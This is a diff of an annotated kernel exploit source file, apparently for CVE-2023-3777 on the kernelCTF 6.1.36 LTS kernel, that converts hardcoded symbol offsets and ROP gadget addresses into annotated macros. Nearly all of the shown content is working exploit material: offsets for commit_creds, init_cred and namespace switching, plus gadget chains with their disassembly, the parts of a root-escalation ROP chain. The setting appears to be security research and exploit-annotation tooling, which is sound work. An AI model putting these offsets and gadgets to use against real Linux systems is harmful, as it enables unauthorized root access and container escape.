--- /home/jack/Documents/college/purdue/research/security-research/pocs/linux/kernelctf/CVE-2023-3777_lts/exploit/lts-6.1.36/exploit_annotated.c
+++ /home/jack/Documents/college/purdue/research/security-research/pocs/linux/kernelctf/CVE-2023-3777_lts/exploit/lts-6.1.36/exploit_annotated.c
@@ -1,3 +1,4 @@
+#include "kexploit.h"
 #define _GNU_SOURCE
 
 #include <stdio.h>
@@ -24,13 +25,13 @@
 
 #include "netlink_utils.h"
 
-uint64_t find_task_by_vpid_off = 0x1b5600;
-uint64_t switch_task_namespaces_off = 0x1bd180;
-uint64_t commit_creds_off = 0x1bed10;
-uint64_t init_nsproxy_off = 0x26765c0;
-uint64_t init_cred_off = 0x2676800;
-uint64_t swapgs_restore_regs_and_return_to_usermode_off = 0x12010c6;
-uint64_t nft_counter_ops_off = 0x1b26680;
+uint64_t find_task_by_vpid_off = __kexploit_kernel_offset(0x1b5600);
+uint64_t switch_task_namespaces_off = __kexploit_kernel_offset(0x1bd180);
+uint64_t commit_creds_off = __kexploit_kernel_offset(0x1bed10);
+uint64_t init_nsproxy_off = __kexploit_kernel_offset(0x26765c0);
+uint64_t init_cred_off = __kexploit_kernel_offset(0x2676800);
+uint64_t swapgs_restore_regs_and_return_to_usermode_off = __kexploit_rop_offset(0x12010c6, "mov rdi, rsp; mov rsp, qword ptr gs:[0x6004]; push qword ptr [rdi + 0x30]; push qword ptr [rdi + 0x28]; push qword ptr [rdi + 0x20]; push qword ptr [rdi + 0x18]; push qword ptr [rdi + 0x10]; push qword ptr [rdi]; push rax; jmp 0xffffffff82201129");
+uint64_t nft_counter_ops_off = __kexploit_kernel_offset(0x1b26680);
 
 // new offsets
 // uint64_t find_task_by_vpid_off = 0xbb6f0;
@@ -71,14 +72,14 @@
 // uint64_t mov_rax_rcx_ret = 0x72342b; // TODO
 // uint64_t pop_rsp_ret = 0x282a0;
 
-uint64_t push_rbx_pop_rsp = 0xf5b269;
-uint64_t pop_rdi_ret = 0x088893;
-uint64_t pop_rsi_ret = 0x0d88a3;
-uint64_t mov_rdi_rax_ret = 0x1142a6b;
-uint64_t add_rax_rsi_ret = 0x036590;
-uint64_t pop_rcx_ret = 0x0271ec;
-uint64_t mov_rax_rcx_ret = 0x72342b;
-uint64_t pop_rsp_ret = 0x068961;
+uint64_t push_rbx_pop_rsp = __kexploit_rop_offset(0xf5b269, "push rbx; and byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; jmp 0xffffffff82404b80");
+uint64_t pop_rdi_ret = __kexploit_rop_offset(0x88893, "pop rdi; jmp 0xffffffff82404b80");
+uint64_t pop_rsi_ret = __kexploit_rop_offset(0xd88a3, "pop rsi; jmp 0xffffffff82404b80");
+uint64_t mov_rdi_rax_ret = __kexploit_rop_offset(0x1142a6b, "mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; jmp 0xffffffff82404b80");
+uint64_t add_rax_rsi_ret = __kexploit_rop_offset(0x36590, "add rax, rsi; jmp 0xffffffff82404b80");
+uint64_t pop_rcx_ret = __kexploit_rop_offset(0x271ec, "pop rcx; jmp 0xffffffff82404b80");
+uint64_t mov_rax_rcx_ret = __kexploit_rop_offset(0x72342b, "mov qword ptr [rax], rcx; jmp 0xffffffff82404b80");
+uint64_t pop_rsp_ret = __kexploit_rop_offset(0x68961, "pop rsp; jmp 0xffffffff82404b80");
 
 uint64_t nft_counter_ops = 0;
 uint64_t kbase = 0;
@@ -868,3 +869,5 @@
     return 0;
 }
 
+__kexploit_src_metadata("{\"kernel_name\": \"kernelctf_6.1.36_lts\"}")
+
